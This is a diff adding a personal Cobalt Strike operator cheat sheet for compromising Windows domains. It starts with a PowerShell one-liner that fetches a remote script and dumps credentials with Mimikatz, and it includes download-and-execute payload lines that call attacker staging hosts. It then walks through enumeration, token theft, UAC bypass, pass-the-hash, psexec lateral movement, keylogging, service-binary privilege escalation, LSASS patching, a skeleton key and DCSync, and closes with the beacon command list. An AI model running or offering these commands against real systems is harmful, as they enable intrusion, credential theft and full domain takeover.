@@ -1,0 +1,323 @@
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds
+
+
+------------------------------------------------------------------------------------------------------
+server/listeners/stagin host   [Listener box]
+download tasks/beacons         [beacon box]
+intitial session               [atacks box]
+
+
+
+1. HTTP beacon::::::::::::::::::::::::::::::::::
+------------------------------------------------------------------------------------------------------
+
+Set up Redirectors:
+ssh -i ec2.pem ubuntu@r4.abc.com
+/bin/bash
+screen
+socat TCP4-LISTEN:80,fork TCP4:192.168.1.20:80
+
+Listeners:ec2
+windows/beacon_http/reverse_http
+r1.abc.com:80              --------------> stager
+
+r2.abc.com                 --------------> download tasks
+
+attacks-> web-drive by -> scripted web delivery:
+r4.abc.com                 --------------> intial session
+
+This attack hosts an artifact that delivers a Cobalt Strike payload. The provided one-liner will allow you to quickly get a session on a target host.
+copy paste the payload in target machine: 
+powershell.exe "IEX (new-object net.webclient).downloadstring('http://r4.abc.com/a')"
+------------------------------------------------------------------------------------------------------
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.220.46.185:80/d'))"
+net 
+
+
+1. info gathering:::::
+Identify domain name:
+shell net view /domain
+
+Get list of DC's:
+shell nltest /dclist:<<domainname>>
+
+shell net group "Domain Computers" /DOMAIN
+list of workstations and servers joined the domain
+
+shell nltest /domain_trusts
+shell nltest /server:[address] /domain_trusts
+map domain trusts
+
+net view \\[name]
+list shares on a host
+
+list domain admins
+net group "domain admins" /domain
+net group "enterprise admins" /domain
+net localgroup "administrators" /domain
+
+2. To gain admin access on a machine:::::
+ps (look for interesting tokens)
+steal_token [ps]
+rev2self
+
+shell whoami /groups
+windows/beacon_smb/bind_pipe
+bypassuac <<smb beacon name>>
+
+2.5 credentials
+make_token domain\user pwd (requires admin access)
+spawnas domain\user pwd (dont require admin access)
+net use \\host\c$ /user:domain\user pwd (establish session with target)
+ 
+3. password dump commands::::
+wdigest
+hashdump
+
+4. (if same local administrator exists)
+shell dir \\computername\C$
+pth Administrator <<passthehashvalue>> powershell -w hidden
+steal_token <PID obtained from pervious step>>
+shell dir \\computername\C$
+
+wmi <<ceobox>>  <<smb reverse payload name>>
+ 
+rev2self --> drop elevated token; similar to back
+
+5. Check if current user is local admin in other machines::::::
+powershell-import /home/rbkarthick/Desktop/Veil-PowerView/PowerView.ps1
+powershell-import /home/rbkarthick/Desktop/cobalt/PowerView.ps1
+powershell Invoke-FindLocalAdminAccess
+
+{powershell Get-Help <cmdlet> -Full}
+
+psexec <<fileserver>> ADMIN$ <<smb reverse payload name>>
+
+-- 
+Invoke-EnumerateLocalAdmins (find local admins on a host)
+Invoke-Netview (find machines on local domain)
+Invoke-ShareFinder (find non-std shares on network)
+Invoke-MapDomainTrusts (find all trusts for current domain) 
+
+
+6. check process running as other user (Domain Admins)          ::::note system privilege required
+ps         
+steal_token <<PID_of_domain_admins>>
+psexec <<DC>> SYSVOL <<smb pipe listener>>
+
+7.Gain access to other system using domain admin
+ps
+steal_token <<processrunning as domain admin>>
+psexec_psh <<othermachines>> <<smb pipe listener>>
+psexec <<othermachines>> ADMIN$ <<smb pipe listener>>
+
+8. Post exploation:
+process (select all machine via graph)
+screenshots
+keylogstrokes
+
+9. Use armitage & metasploit in Cobaltstrike
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+
+
+9.1. armitage to deliver CS beacon
+ms11_003
+-> change srvport,lport,lhost= cobaltstrike http beacon port & ip
+-- disable payloadhandler; URIPATH /
+
+9.2. armitage to deliver CS beacon via socksproxy
+-->configure (socks 9899) command in one of the compromised machines
+-->tunnel (copy payload= setg Proxies socks4:<<CSIP>>:<<CSPORT>>) and paste in armitage
+configure any msfmodule
+
+9.3 use CS foreign listener
+windows/foreign/reverse_tcp
+metasploit_hostip
+msflistener port
+
+<configure armitage listener>
+ spwan --> already compromised machines in CS to armitage
+
+ 9.4 pivot listener (turning a compromised machine as redirectors)
+
+10.
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+11. privilege escalation scanner:
+powershell-import /home/rbkarthick/Desktop/karthi/tools/infra/PowerUp/PowerUp.ps1
+powershell Invoke-AllChecks
+
+(if vuln service found AdobeARMservice
+C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe)
+
+create and upload executables
+Attacks>packages->windows executable (s)->windows services
+cd c:\users\<>
+upload /root/evil.exe
+shell sc config AdobeARMservice binpath= c:\users\<>\evil.exe
+shell sc stop AdobeARMservice
+shell sc start AdobeARMservice
+link 127.0.0.1
+
+12.Mimikatz
+hashdump
+logonpasswords
+
+mimikatz !lsadump::cache (dump cached credentials)
+mimikatz !lsadump::sam
+mimikatz misc::cmd
+mimikatz !misc::memssp (patch lsass to log credetials after auth c:\windows\system32\mimilsa.log)
+mimikatz misc::skeleton (for DC onlyl patch lsass to make'mimikatz' password work for all users on the domain)
+mimikatz 
+
+REmote mimikatz execution:
+powershell-import /home/rbkarthick/Desktop/karthi/tools/infra/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
+powershell Invoke-Mimikatz -ComputerName <<>>
+
+13.privilege escalation options:
+bypassuac (7+) (localadmin med->high)
+elevate (7) (any unpatched->system)
+getsystem (all) (localadmin high->system)
+runas (all) (any->any)
+spawnas (all) (any->any)
+
+spawnas .\Administrator <>
+
+13. 5985 port (WinRM remote management)
+
+
+
+shell dir \\10.38.196.1\sysvol\
+shell where /r H:\ web.config
+shell net use Z: \\DGV-DCO01.deGoudse.local\sysvol\ /p:yes
+shell net use Z: /delete
+
+----------------------
+checkin
+----------------------
+1. File download
+to downlad a file
+download <<filename>>
+
+list current scheduled downloads
+downloads
+
+cancel download
+cancel <<file|*>>
+
+view->downloads
+ 
+2. File uploads
+to upload a file
+upload <<filename>>
+
+change file time stamp
+timestamp <<dst>> <<src>>
+
+3.User exploitation
+jobs
+jobkill <<id>>
+screenshot <pid> [x86|x64] [time]		view->screeshots
+keylogger <pid> [x86|x64] [time]		view->keyloggers
+
+browser pivot
+
+4.port scan
+portscan [host] [port] [arp|icmp|none] [max=4 or xp ;1024 for win7]
+
+-----------------------------
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">Exception calling "FindAll" with "0" argument(s): "The specified domain either _x000D__x000A_</S><S S="Error">does not exist or could not be contacted._x000D__x000A_</S><S S="Error">"_x000D__x000A_</S><S S="Error">At line:1772 char:9_x000D__x000A_</S><S S="Error">+         $CompSearcher.FindAll() | ForEach-Object {_x000D__x000A_</S><S S="Error">+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : COMException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+				beacon> powershell -version 2 -exec bypass
+
+----------------------------
+
+    argue                     Spoof arguments for matching processes
+    browserpivot              Setup a browser pivot session
+    bypassuac                 Spawn a session in a high integrity process
+    cancel                    Cancel a download that's in-progress
+    cd                        Change directory
+    checkin                   Call home and post data
+    clear                     Clear beacon queue
+    connect                   Connect to a Beacon peer over TCP
+    covertvpn                 Deploy Covert VPN client
+    cp                        Copy a file
+    dcsync                    Extract a password hash from a DC
+    desktop                   View and interact with target's desktop
+    dllinject                 Inject a Reflective DLL into a process
+    dllload                   Load DLL into a process with LoadLibrary()
+    download                  Download a file
+    downloads                 Lists file downloads in progress
+    drives                    List drives on target
+    elevate                   Try to elevate privileges
+    execute                   Execute a program on target (no output)
+    execute-assembly          Execute a local .NET program in-memory on target
+    exit                      Terminate the beacon session
+    getprivs                  Enable system privileges on current token
+    getsystem                 Attempt to get SYSTEM
+    getuid                    Get User ID
+    hashdump                  Dump password hashes
+    help                      Help menu
+    inject                    Spawn a session in a specific process
+    jobkill                   Kill a long-running post-exploitation task
+    jobs                      List long-running post-exploitation tasks
+    kerberos_ccache_use       Apply kerberos ticket from cache to this session
+    kerberos_ticket_purge     Purge kerberos tickets from this session
+    kerberos_ticket_use       Apply kerberos ticket to this session
+    keylogger                 Inject a keystroke logger into a process
+    kill                      Kill a process
+    link                      Connect to a Beacon peer over a named pipe
+    logonpasswords            Dump credentials and hashes with mimikatz
+    ls                        List files
+    make_token                Create a token to pass credentials
+    mimikatz                  Runs a mimikatz command
+    mkdir                     Make a directory
+    mode dns                  Use DNS A as data channel (DNS beacon only)
+    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
+    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)
+    mode http                 Use HTTP as data channel
+    mv                        Move a file
+    net                       Network and host enumeration tool
+    note                      Assign a note to this Beacon       
+    portscan                  Scan a network for open services
+    powerpick                 Execute a command via Unmanaged PowerShell
+    powershell                Execute a command via powershell.exe
+    powershell-import         Import a powershell script
+    ppid                      Set parent PID for spawned post-ex jobs
+    ps                        Show process list
+    psexec                    Use a service to spawn a session on a host
+    psexec_psh                Use PowerShell to spawn a session on a host
+    psinject                  Execute PowerShell command in specific process
+    pth                       Pass-the-hash using Mimikatz
+    pwd                       Print current directory
+    reg                       Query the registry
+    rev2self                  Revert to original token
+    rm                        Remove a file or folder
+    rportfwd                  Setup a reverse port forward
+    run                       Execute a program on target (returns output)
+    runas                     Execute a program as another user
+    runasadmin                Execute a program in a high-integrity context
+    runu                      Execute a program under another PID
+    screenshot                Take a screenshot
+    setenv                    Set an environment variable
+    shell                     Execute a command via cmd.exe
+    shinject                  Inject shellcode into a process
+    shspawn                   Spawn process and inject shellcode into it
+    sleep                     Set beacon sleep time
+    socks                     Start SOCKS4a server to relay traffic
+    socks stop                Stop SOCKS4a server
+    spawn                     Spawn a session 
+    spawnas                   Spawn a session as another user
+    spawnto                   Set executable to spawn processes into
+    spawnu                    Spawn a session under another PID
+    ssh                       Use SSH to spawn an SSH session on a host
+    ssh-key                   Use SSH to spawn an SSH session on a host
+    steal_token               Steal access token from a process
+    timestomp                 Apply timestamps from one file to another
+    unlink                    Disconnect from parent Beacon
+    upload                    Upload a file
+    wdigest                   Dump plaintext credentials with mimikatz
+    winrm                     Use WinRM to spawn a session on a host
+    wmi                       Use WMI to spawn a session on a host
